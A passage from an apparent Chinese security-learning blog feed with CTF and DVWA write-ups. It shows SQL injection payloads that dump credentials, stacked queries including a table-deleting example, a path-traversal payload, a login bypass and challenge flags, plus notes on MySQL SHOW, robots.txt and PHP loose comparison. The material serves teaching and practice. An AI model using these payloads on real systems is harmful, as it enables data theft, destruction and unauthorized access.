<p>输入 <code>1' order by 1#</code>和 <code>1' order by 2#</code>时都返回正常：<br><img src="./sql%E6%B3%A8%E5%85%A5-4.jpg"><br><img src="./sql%E6%B3%A8%E5%85%A5-5.jpg"><br>当输入 <code>1' order by 3#</code>时，返回错误：<br><img src="./sql%E6%B3%A8%E5%85%A5-6.jpg"><br>由此可知，users 表中只有两个字段，数据为两列。</p>
<p>接下来我们使用 <code>union select</code> 联合查询继续获取信息。<br>union 运算符可以将两个或两个以上 select 语句的查询结果集合合并成一个结果集合显示，即执行联合查询。需要注意在使用 union 查询的时候需要和主查询的列数相同，而我们之前已经知道了主查询列数为 2，接下来就好办了。<br>输入 <code>1' union select database(),user()#</code> 进行查询 ：</p>
<p>・database () 将会返回当前网站所使用的数据库名字.<br>・user () 将会返回执行当前查询的用户名.</p>
<p>实际执行的 Sql 语句是:<br><code>SELECT first_name, last_name FROM users WHERE user_id = '1' union select database(),user()#`;</code><br><img src="./sql%E6%B3%A8%E5%85%A5-7.jpg"><br>通过上图返回信息，我们成功获取到：</p>
<p>当前网站使用数据库为 dvwa .<br>当前执行查询用户名为 root@localhost .<br>同理我们再输入 <code>1' union select version(),@@version_compile_os#</code>进行查询：</p>
<p>version () 获取当前数据库版本.<br>@@version_compile_os 获取当前操作系统。<br>实际执行的 Sql 语句是:<br><code>SELECT first_name, last_name FROM users WHERE user_id = '1' union select version(),@@version_compile_os#`;</code><br><img src="./sql%E6%B3%A8%E5%85%A5-8.jpg"><br>通过上图返回信息，我们又成功获取到：</p>
<p>・当前数据库版本为 : 5.6.31-0ubuntu0.15.10.1.<br>・当前操作系统为 : debian-linux-gnu</p>
<p>接下来我们尝试获取 dvwa 数据库中的表名。<br><code>information_schema</code> 是 mysql 自带的一张表，这张数据表保存了 Mysql 服务器所有数据库的信息，如数据库名，数据库的表，表栏的数据类型与访问权限等。该数据库拥有一个名为 tables 的数据表，该表包含两个字段 table_name 和 table_schema，分别记录 DBMS 中的存储的表名和表名所在的数据库。</p>
<p>我们输入 <code>1' union select table_name,table_schema from information_schema.tables where table_schema= 'dvwa'#</code>进行查询：<br>实际执行的 Sql 语句是：</p>
<p><code>SELECT first_name, last_name FROM users WHERE user_id = '1' union select table_name,table_schema from information_schema.tables where table_schema= 'dvwa'#`;</code><br><img src="./sql%E6%B3%A8%E5%85%A5-10.jpg"><br>通过上图返回信息，我们再获取到：</p>
<p>・dvwa 数据库有两个数据表，分别是 guestbook 和 users .<br>有些同学肯定还不满足目前获取到的信息，那么我们接下来尝试获取重量级的用户名、密码。<br>由经验我们可以大胆猜测 users 表的字段为 user 和 password ，所以输入：<code>1' union select user,password from users#</code>进行查询：<br>实际执行的 Sql 语句是：<br><code>SELECT first_name, last_name FROM users WHERE user_id = '1' union select user,password from users#`;</code><br><img src="./sql%E6%B3%A8%E5%85%A5-11.jpg"><br>可以看到成功爆出用户名、密码，密码采用 md5 进行加密，可以到 <code>www.cmd5.com</code> 进行解密。<br>直此，同学们应该已经对 Sql 注入有了一个大概得了解，也清楚了 Sql 注入的强大。</p>
<p>转自：<a href="https://www.jianshu.com/p/078df7a35671">简书 - Jewel591-sql 注入基础原理（超详细）</a></p>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sql 注入 - 堆叠注入</title>
    <url>/2020/08/04/sql%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h1><p>在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。试想一下我们在；结束一个 sql 语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而 <code>union injection</code>（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于 <code>union</code> 或者 <code>union all</code> 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：<code>1; DELETE FROM products</code> 服务器端生成的 sql 语句为：（因未对输入的参数进行过滤）<code>Select * from products where productid=1;DELETE FROM products</code> 当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
<span id="more"></span>
<h1 id="0x01-ctf题目测试"><a href="#0x01-ctf题目测试" class="headerlink" title="0x01 ctf题目测试"></a>0x01 ctf 题目测试</h1><p>题目：[强网杯 2019] 随便注<br><img src="./sql%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-1.png"></p>
<h2 id="0X11"><a href="#0X11" class="headerlink" title="0X11"></a>0X11</h2><p>首先测试常规 <code>union</code> 注入<br>输入 <code>1</code> 有回显<br><img src="./sql%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-2.png"><br>输入 <code>1'</code> 报错<br><img src="./sql%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-3.png"><br>输入 <code>1'#</code>有回显，说明存在 sql 注入<br><img src="./sql%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-4.png"><br>输入 <code>1' order 2#</code>有回显，但是 <code>1' order 3#</code>无回显，说明有两列输出<br><img src="./sql%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-5.png"><br><img src="./sql%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-6.png"><br>输入 <code>1' and 1=2 union select version(),database()#</code>，显示<br><img src="./sql%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-7.png"><br>说明被限制权限，常规办法用不了</p>
<h2 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h2><p>那就是堆叠注入了<br>输入 <code>1';show databases; #</code>, 回显正常，存在堆叠注入<br><img src="./sql%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-8.png"><br>输入 <code>1';show tables; #</code>, 爆出两个表，”1919810931114514” 和 “words”<br><img src="./sql%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-9.png"><br>判断网页连接的是哪张表<br>输入 <code>1'; show columns from `words`;#</code>发现有两个字段<br><img src="./sql%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-10.png"><br>而 <code>1'; show columns from `1919810931114514`;#</code>只有一个字段，并且是”flag”<br><img src="./sql%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-11.png"><br>结合 0x11 里得出的两个字段，也就是两个列，所以得出结论，网页连接的是”words” 表，并且是字段”id”，在 0x11 里我们知道了后台限制了权限，但是并没有限制 “alert” 和 “rename”，那么我们是不是可以把表改个名字，再给列改个名字呢。先把 words 改名为 words1，再把这个数字表改名为 words，然后把新的 words 里的 flag 列改为 id。<br>我们输入 <code>1';RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100);show columns from words;#</code>(不懂得可以去查 sql 语法)。<br>最后输入 <code>1' or '1'='1</code> 强制语句正确，得到 flag<br><img src="./sql%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-12.png"></p>
<p>最后说明一下 “‘“ 和 “`” 的区别<br>linux 下不区分，windows 下区分<br>区别:<br>单引号 (‘) 或双引号主要用于字符串的引用符号<br>eg：mysql&gt; SELECT ‘hello’, “hello” ;</p>
<p>反勾号 (`) 主要用于数据库、表、索引、列和别名用的引用符是 [Esc 下面的键]<br>eg:`mysql&gt;SELECT * FROM   `table`   WHERE `from` = ‘abc’ ;</p>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL-show 语法</title>
    <url>/2020/08/04/MySQL-show%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<h1 id="MySQL中show语法"><a href="#MySQL中show语法" class="headerlink" title="MySQL中show语法"></a>MySQL 中 show 语法</h1><ol>
<li>show tables 或 show tables from database_name; – 显示当前数据库中所有表的名称。 </li>
<li>show databases; – 显示 mysql 中所有数据库的名称。 </li>
<li>show columns from table_name from database_name; 或 show columns from database_name.table_name; – 显示表中列名称。 </li>
<li>show grants for user_name; – 显示一个用户的权限，显示结果类似于 grant 命令。 </li>
<li>show index from table_name; – 显示表的索引。 </li>
<li>show status; – 显示一些系统特定资源的信息，例如，正在运行的线程数量。 </li>
<li>show variables; – 显示系统变量的名称和值。 </li>
<li>show processlist; – 显示系统中正在运行的所有进程，也就是当前正在执行的查询。大多数用户可以查看他们自己的进程，但是如果他们拥有 process 权限，就可以查看所有人的进程，包括密码。 </li>
<li>show table status; – 显示当前使用或者指定的 database 中的每个表的信息。信息包括表类型和表的最新更新时间。 </li>
<li>show privileges; – 显示服务器所支持的不同权限。 </li>
<li>show create database database_name; – 显示 create database 语句是否能够创建指定的数据库。 </li>
<li>show create table table_name; – 显示 create database 语句是否能够创建指定的数据库。 </li>
<li>show engines; – 显示安装以后可用的存储引擎和默认引擎。 </li>
<li>show innodb status; – 显示 innoDB 存储引擎的状态。 </li>
<li>show logs; – 显示 BDB 存储引擎的日志。 </li>
<li>show warnings; – 显示最后一个执行的语句所产生的错误、警告和通知。 </li>
<li>show errors; – 只显示最后一个执行语句所产生的错误。 </li>
<li>show [storage] engines; –显示安装后的可用存储引擎和默认引擎。</li>
</ol>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf-web</title>
    <url>/2020/08/08/buuctf-web/</url>
    <content><![CDATA[<h2 id="1-HCTF-2018-WarmUp-1-2020-08-09"><a href="#1-HCTF-2018-WarmUp-1-2020-08-09" class="headerlink" title="1.[HCTF 2018]WarmUp-1 2020.08.09"></a>1.[HCTF 2018]WarmUp-1 2020.08.09</h2><p><img src="./%5BHCTF%202018%5DWarmUp-1.png"><br>打开网页，查看源代码，发现 <code>source.php</code>，添加到 url 后进入<br><img src="./%5BHCTF%202018%5DWarmUp-2.png"></p>
<span id="more"></span>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    {</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        {</span><br><span class="line">            $whitelist = ["source"=&gt;"source.php","hint"=&gt;"hint.php"];</span><br><span class="line">            if (! isset($page) || !is_string($page)) {</span><br><span class="line">                echo "you can't see it";</span><br><span class="line">                return false;</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) {</span><br><span class="line">                return true;</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . '?', '?')</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) {</span><br><span class="line">                return true;</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . '?', '?')</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) {</span><br><span class="line">                return true;</span><br><span class="line">            }</span><br><span class="line">            echo "you can't see it";</span><br><span class="line">            return false;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST['file'])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST['file'])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST['file'])</span><br><span class="line">    ) {</span><br><span class="line">        include $_REQUEST['file'];</span><br><span class="line">        exit;</span><br><span class="line">    } else {</span><br><span class="line">        echo "&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;";</span><br><span class="line">    }  </span><br><span class="line">?&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>checkfile () 函数<br>   （1）定义了一个白名单：source.php 和 hint.php，判断 $page 是否为空、是否为字符串。<br>   （2）判断 $page 是否在白名单里，若存在返回 true；<br>   （3）考虑到 page 有参数的情况，$_page 是取出 $page 问号前的东西，然后再判断 $_page 是否在白名单里，若存在则返回 true；<br>   （4）如果上一步判断失败，则又考虑了 url 编码的问题，因为 url 在传入以后服务器会自动进行一次解码。因此传入二次编码后的内容，就可以使 checkfile 返回 true。<br>payload：<br>下面两个 payload 都可以，只不过返回 true 的地方不一样。<br><code>file=hint.php?/../../../../../../../../ffffllllaaaagggg</code><br><code>file=hint.php%253f/../../../../../../../../ffffllllaaaagggg</code><br>flag：flag{9af1e604-8c6a-4ea3-ac60-86d8d348c371}</p>
<h2 id="2-强网杯-2019-随便注-2020-08-09"><a href="#2-强网杯-2019-随便注-2020-08-09" class="headerlink" title="2.[强网杯 2019]随便注 2020.08.09"></a>2.[强网杯 2019] 随便注 2020.08.09</h2><p><img src="./%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8-1.png"><br>2X1<br>首先测试常规 <code>union</code> 注入<br>输入 <code>1</code> 有回显<br><img src="./%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8-2.png"><br>输入 <code>1'</code> 报错<br><img src="./%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8-3.png"><br>输入 <code>1'#</code>有回显，说明存在 sql 注入<br><img src="./%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8-4.png"><br>输入 <code>1' order 2#</code>有回显，但是 <code>1' order 3#</code>无回显，说明有两列输出<br><img src="./%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8-5.png"><br><img src="./%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8-6.png"><br>输入 <code>1' and 1=2 union select version(),database()#</code>，显示<br><img src="./%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8-7.png"><br>说明被限制权限，常规办法用不了</p>
<p>2x2<br>那就是堆叠注入了<br>输入 <code>1';show databases; #</code>, 回显正常，存在堆叠注入<br><img src="./%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8-8.png"><br>输入 <code>1';show tables; #</code>, 爆出两个表，”1919810931114514” 和 “words”<br><img src="./%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8-9.png"><br>判断网页连接的是哪张表<br>输入 <code>1'; show columns from `words`;#</code>发现有两个字段<br><img src="./%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8-10.png"><br>而 <code>1'; show columns from `1919810931114514`;#</code>只有一个字段，并且是”flag”<br><img src="./%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8-11.png"><br>结合 0x11 里得出的两个字段，也就是两个列，所以得出结论，网页连接的是”words” 表，并且是字段”id”，在 0x11 里我们知道了后台限制了权限，但是并没有限制 “alert” 和 “rename”，那么我们是不是可以把表改个名字，再给列改个名字呢。先把 words 改名为 words1，再把这个数字表改名为 words，然后把新的 words 里的 flag 列改为 id。<br>我们输入 <code>1';RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100);show columns from words;#</code>(不懂得可以去查 sql 语法)。<br>最后输入 <code>1' or '1'='1</code> 强制语句正确，得到 flag<br><img src="./%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8-12.png"></p>
<p>最后说明一下 “‘“ 和 “`” 的区别<br>linux 下不区分，windows 下区分<br>区别:<br>单引号 (‘) 或双引号主要用于字符串的引用符号<br>eg：mysql&gt; SELECT ‘hello’, “hello” ;</p>
<p>反勾号 (`) 主要用于数据库、表、索引、列和别名用的引用符是 [Esc 下面的键]<br>eg:`mysql&gt;SELECT * FROM   `table`   WHERE `from` = ‘abc’ ;<br>flag：flag{bf5c21ad-0216-455f-898f-bf5cf4e05bbf}</p>
<h2 id="3-极客大挑战-2019-EasySQL-2020-08-09"><a href="#3-极客大挑战-2019-EasySQL-2020-08-09" class="headerlink" title="3.[极客大挑战 2019]EasySQL 2020.08.09"></a>3.[极客大挑战 2019] EasySQL 2020.08.09</h2><p><img src="./%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DEasySQL-1.png"><br>先随便输入一些账号密码<br><img src="./%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DEasySQL-2.png"><br>url 为：<code>http://e7ec36b6-8325-4d1e-8926-c869e5f54e26.node3.buuoj.cn/check.php?username=123&amp;password=456</code><br>实际进行的操作为：<br><code>select * from users where username='123' and password='123'</code><br>当查询到数据表中存在同时满足 username 和 password 字段时，会返回登录成功。<br>按照第一个实例的思路，我们尝试在用户名中输入 123’ or 1=1 #, 密码同样输入 123’ or 1=1 # ：<br><img src="./%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DEasySQL-3.png"><br>实际进行的操作为：<br><code>select * from users where username='123' or 1=1 #' and password='123' or 1=1 #'</code><br>按照 Mysql 语法，# 后面的内容会被忽略，所以以上语句等同于（实际上密码框里不输入任何东西也一样）：<br>由于判断语句 or 1=1 恒成立，所以结果当然返回真，成功登录。<br>我们再尝试不使用 # 屏蔽单引号，采用手动闭合的方式：<br>我们尝试在用户名中输入 <code>123' or '1'='1</code>, 密码同样输入 <code>123' or '1'='1</code> （不能少了单引号，否则会有语法错误）：</p>
<p>两个 or 语句使 and 前后两个判断永远恒等于真，所以能够成功登录。<br><img src="./%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DEasySQL-4.png"><br>flag：flag{afe695c5-87da-4a55-9c6d-2f27fc014388}</p>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>WriteUp-buuctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Robots协议</title>
    <url>/2020/08/11/Robots%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<h1 id="Robots协议"><a href="#Robots协议" class="headerlink" title="Robots协议"></a>Robots协议</h1><p><code>Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除标准”（Robots ExclusionProtocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取.</code></p>
<p>根据协议，网站管理员可以在网站域名的根目录下放一个robots.txt 文本文件，里面可以指定不同的网络爬虫能访问的页面和禁止访问的页面，指定的页面由正则表达式表示。网络爬虫在采集这个网站之前，首先获取到这个文件，然后解析到其中的规则，然后根据规则来采集网站的数据。</p>
<p>为什么需要Robots协议<br>互联网上的网页是通过超级链接互相关联起来的，从而形成了网页的网状结构。爬虫的工作方式就像蜘蛛在网上沿着链接爬来爬去，最基本的流程可以简化如下：</p>
<a id="more"></a>
<ol>
<li>喂给爬虫一堆url，我们称之为种子(seeds)；</li>
<li>爬虫抓取seeds，解析html网页，抽取其中的超级链接；</li>
<li>爬虫接着抓取这些新发现的链接指向的网页。</li>
<li>步骤2和步骤3循环往复。</li>
</ol>
<p>了解了上面的流程就能发现：对爬虫来说网站非常被动，只有老老实实被抓取的份。</p>
<p>所以，对于网站的管理者来说，就存在这样的需求：</p>
<p>某些路径下是个人隐私或者网站管理使用，不想被搜索引擎抓取，比如说日本爱情动作片；<br>不喜欢某个搜索引擎，不愿意被他抓取，最有名的就是之前淘宝不希望被百度抓取；<br>小网站使用的是公用的虚拟主机，流量有限或者需要付费，希望搜索引擎抓的温柔点；<br>某些网页是动态生成的，没有直接的链接指向，但是希望内容被搜索引擎抓取和索引。</p>
<p>网站内容的所有者是网站管理员，搜索引擎应该尊重所有者的意愿，为了满足以上等等，就需要提供一种网站和爬虫进行沟通的途径，给网站管理员表达自己意愿的机会。有需求就有供应，robots协议就此诞生。</p>
<h2 id="案例："><a href="#案例：" class="headerlink" title="案例："></a>案例：</h2><h3 id="京东的Robots协议"><a href="#京东的Robots协议" class="headerlink" title="京东的Robots协议"></a>京东的Robots协议</h3><p><code>https://www.jd.com/robots.txt</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-agent: * </span><br><span class="line">Disallow: &#x2F;?* </span><br><span class="line">Disallow: &#x2F;pop&#x2F;*.html </span><br><span class="line">Disallow: &#x2F;pinpai&#x2F;*.html?* </span><br><span class="line">User-agent: EtaoSpider </span><br><span class="line">Disallow: &#x2F; </span><br><span class="line">User-agent: HuihuiSpider </span><br><span class="line">Disallow: &#x2F; </span><br><span class="line">User-agent: GwdangSpider </span><br><span class="line">Disallow: &#x2F; </span><br><span class="line">User-agent: WochachaSpider </span><br><span class="line">Disallow: &#x2F;</span><br></pre></td></tr></table></figure>

<h3 id="百度的Robots协议"><a href="#百度的Robots协议" class="headerlink" title="百度的Robots协议"></a>百度的Robots协议</h3><p><code>https://www.baidu.com/robots.txt</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-agent: Baiduspider</span><br><span class="line">Disallow: &#x2F;baidu</span><br><span class="line">Disallow: &#x2F;s?</span><br><span class="line">Disallow: &#x2F;ulink?</span><br><span class="line">Disallow: &#x2F;link?</span><br><span class="line"></span><br><span class="line">User-agent: Googlebot</span><br><span class="line">Disallow: &#x2F;baidu</span><br><span class="line">Disallow: &#x2F;s?</span><br><span class="line">Disallow: &#x2F;shifen&#x2F;</span><br><span class="line">Disallow: &#x2F;homepage&#x2F;</span><br><span class="line">Disallow: &#x2F;cpro</span><br><span class="line">Disallow: &#x2F;ulink?</span><br><span class="line">Disallow: &#x2F;link?</span><br><span class="line"></span><br><span class="line">User-agent: MSNBot</span><br><span class="line">Disallow: &#x2F;baidu</span><br><span class="line">Disallow: &#x2F;s?</span><br><span class="line">Disallow: &#x2F;shifen&#x2F;</span><br><span class="line">Disallow: &#x2F;homepage&#x2F;</span><br><span class="line">Disallow: &#x2F;cpro</span><br><span class="line">Disallow: &#x2F;ulink?</span><br><span class="line">Disallow: &#x2F;link?</span><br><span class="line"></span><br><span class="line">User-agent: Baiduspider-image</span><br><span class="line">Disallow: &#x2F;baidu</span><br><span class="line">Disallow: &#x2F;s?</span><br><span class="line">Disallow: &#x2F;shifen&#x2F;</span><br><span class="line">Disallow: &#x2F;homepage&#x2F;</span><br><span class="line">Disallow: &#x2F;cpro</span><br><span class="line">Disallow: &#x2F;ulink?</span><br><span class="line">Disallow: &#x2F;link?</span><br><span class="line"></span><br><span class="line">User-agent: YoudaoBot</span><br><span class="line">Disallow: &#x2F;baidu</span><br><span class="line">Disallow: &#x2F;s?</span><br><span class="line">Disallow: &#x2F;shifen&#x2F;</span><br><span class="line">Disallow: &#x2F;homepage&#x2F;</span><br><span class="line">Disallow: &#x2F;cpro</span><br><span class="line">Disallow: &#x2F;ulink?</span><br><span class="line">Disallow: &#x2F;link?</span><br><span class="line"></span><br><span class="line">User-agent: Sogou web spider</span><br><span class="line">Disallow: &#x2F;baidu</span><br><span class="line">Disallow: &#x2F;s?</span><br><span class="line">Disallow: &#x2F;shifen&#x2F;</span><br><span class="line">Disallow: &#x2F;homepage&#x2F;</span><br><span class="line">Disallow: &#x2F;cpro</span><br><span class="line">Disallow: &#x2F;ulink?</span><br><span class="line">Disallow: &#x2F;link?</span><br><span class="line"></span><br><span class="line">User-agent: Sogou inst spider</span><br><span class="line">Disallow: &#x2F;baidu</span><br><span class="line">Disallow: &#x2F;s?</span><br><span class="line">Disallow: &#x2F;shifen&#x2F;</span><br><span class="line">Disallow: &#x2F;homepage&#x2F;</span><br><span class="line">Disallow: &#x2F;cpro</span><br><span class="line">Disallow: &#x2F;ulink?</span><br><span class="line">Disallow: &#x2F;link?</span><br><span class="line"></span><br><span class="line">User-agent: Sogou spider2</span><br><span class="line">Disallow: &#x2F;baidu</span><br><span class="line">Disallow: &#x2F;s?</span><br><span class="line">Disallow: &#x2F;shifen&#x2F;</span><br><span class="line">Disallow: &#x2F;homepage&#x2F;</span><br><span class="line">Disallow: &#x2F;cpro</span><br><span class="line">Disallow: &#x2F;ulink?</span><br><span class="line">Disallow: &#x2F;link?</span><br><span class="line"></span><br><span class="line">User-agent: Sogou blog</span><br><span class="line">Disallow: &#x2F;baidu</span><br><span class="line">Disallow: &#x2F;s?</span><br><span class="line">Disallow: &#x2F;shifen&#x2F;</span><br><span class="line">Disallow: &#x2F;homepage&#x2F;</span><br><span class="line">Disallow: &#x2F;cpro</span><br><span class="line">Disallow: &#x2F;ulink?</span><br><span class="line">Disallow: &#x2F;link?</span><br><span class="line"></span><br><span class="line">User-agent: Sogou News Spider</span><br><span class="line">Disallow: &#x2F;baidu</span><br><span class="line">Disallow: &#x2F;s?</span><br><span class="line">Disallow: &#x2F;shifen&#x2F;</span><br><span class="line">Disallow: &#x2F;homepage&#x2F;</span><br><span class="line">Disallow: &#x2F;cpro</span><br><span class="line">Disallow: &#x2F;ulink?</span><br><span class="line">Disallow: &#x2F;link?</span><br><span class="line"></span><br><span class="line">User-agent: Sogou Orion spider</span><br><span class="line">Disallow: &#x2F;baidu</span><br><span class="line">Disallow: &#x2F;s?</span><br><span class="line">Disallow: &#x2F;shifen&#x2F;</span><br><span class="line">Disallow: &#x2F;homepage&#x2F;</span><br><span class="line">Disallow: &#x2F;cpro</span><br><span class="line">Disallow: &#x2F;ulink?</span><br><span class="line">Disallow: &#x2F;link?</span><br><span class="line"></span><br><span class="line">User-agent: ChinasoSpider</span><br><span class="line">Disallow: &#x2F;baidu</span><br><span class="line">Disallow: &#x2F;s?</span><br><span class="line">Disallow: &#x2F;shifen&#x2F;</span><br><span class="line">Disallow: &#x2F;homepage&#x2F;</span><br><span class="line">Disallow: &#x2F;cpro</span><br><span class="line">Disallow: &#x2F;ulink?</span><br><span class="line">Disallow: &#x2F;link?</span><br><span class="line"></span><br><span class="line">User-agent: Sosospider</span><br><span class="line">Disallow: &#x2F;baidu</span><br><span class="line">Disallow: &#x2F;s?</span><br><span class="line">Disallow: &#x2F;shifen&#x2F;</span><br><span class="line">Disallow: &#x2F;homepage&#x2F;</span><br><span class="line">Disallow: &#x2F;cpro</span><br><span class="line">Disallow: &#x2F;ulink?</span><br><span class="line">Disallow: &#x2F;link?</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">User-agent: yisouspider</span><br><span class="line">Disallow: &#x2F;baidu</span><br><span class="line">Disallow: &#x2F;s?</span><br><span class="line">Disallow: &#x2F;shifen&#x2F;</span><br><span class="line">Disallow: &#x2F;homepage&#x2F;</span><br><span class="line">Disallow: &#x2F;cpro</span><br><span class="line">Disallow: &#x2F;ulink?</span><br><span class="line">Disallow: &#x2F;link?</span><br><span class="line"></span><br><span class="line">User-agent: EasouSpider</span><br><span class="line">Disallow: &#x2F;baidu</span><br><span class="line">Disallow: &#x2F;s?</span><br><span class="line">Disallow: &#x2F;shifen&#x2F;</span><br><span class="line">Disallow: &#x2F;homepage&#x2F;</span><br><span class="line">Disallow: &#x2F;cpro</span><br><span class="line">Disallow: &#x2F;ulink?</span><br><span class="line">Disallow: &#x2F;link?</span><br><span class="line"></span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;</span><br></pre></td></tr></table></figure>
<p>上面，*代表所有，/代表根目录</p>
<p>转自：<a href="https://www.jianshu.com/p/d16076661d40" target="_blank" rel="noopener">https://www.jianshu.com/p/d16076661d40</a></p>
]]></content>
  </entry>
  <entry>
    <title>弱类型比较</title>
    <url>/2020/08/11/%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83/</url>
    <content><![CDATA[<h1 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h1><p>当两个不同类型的参数进行 ‘==’ 比较而非 ‘===’ 比较时，将会转换成相同类型进行比较。</p>
<ol>
<li>var_dump(“admin”==0);  //true</li>
<li>var_dump(“1admin”==1); //true</li>
<li>var_dump(“admin1”==1) //false</li>
<li>var_dump(“admin1”==0) //true</li>
<li>var_dump(“0e123456”==”0e4456789”); //true</li>
</ol>
<p>由第 1 个和第 2 个可知，当第一个字符为数字，后面都是字符串或字符时，字符串或字符将会等同于 0，整体等于第 1 个数字加上 0，又因为题目具体要求为与 1 比较，所以这时候的 GET 参数构造就应该为 1xxxxx，xxxxx 为任意字母。</p>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
      <tags>
        <tag>弱类型</tag>
      </tags>
  </entry>
  <entry>
    <title>web 中 xff 与 referer</title>
    <url>/2020/08/12/web%E4%B8%ADxff%E4%B8%8Ereferer/</url>
